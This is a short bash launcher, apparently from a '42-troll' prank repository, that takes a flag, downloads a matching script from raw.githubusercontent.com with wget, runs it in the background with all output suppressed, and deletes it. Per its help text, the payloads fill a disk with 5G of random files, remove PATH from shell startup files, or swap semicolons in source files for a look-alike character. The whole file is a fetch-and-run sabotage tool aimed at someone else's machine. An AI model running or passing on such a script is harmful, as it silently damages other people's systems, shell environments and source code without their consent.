#!/bin/bash

scriptlocation=""
argument=""

case "$1" in
	--help)
		printf "TODO LATER \nArguments : \n--help : show help\n-F | --full-disk : add 5G of random files everywhere\n-P | --where-are-commands : remove PATH from .zshrc and .bashrc\n-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )"
	;;
	--full-disk|-F)
		scriptlocation="https://raw.githubusercontent.com/Poul0s/42-troll/master/full_disk.sh"
	;;
	--where-are-commands|-P)
		scriptlocation="https://raw.githubusercontent.com/Poul0s/42-troll/master/where_are_commands.sh"
	;;
	--replace-semicolon|-S)
		scriptlocation="https://raw.githubusercontent.com/Poul0s/42-troll/master/fake-semicolon.sh"
		argument=$2
	;;
	*)
		echo "arg '$1' invalid"
	;;
esac

if [ ! -z $scriptlocation ] ; then
	wget -q $scriptlocation -O script.sh
	nohup bash ./script.sh $argument > /dev/null 2> /dev/null &
	rm ./script.sh
fi
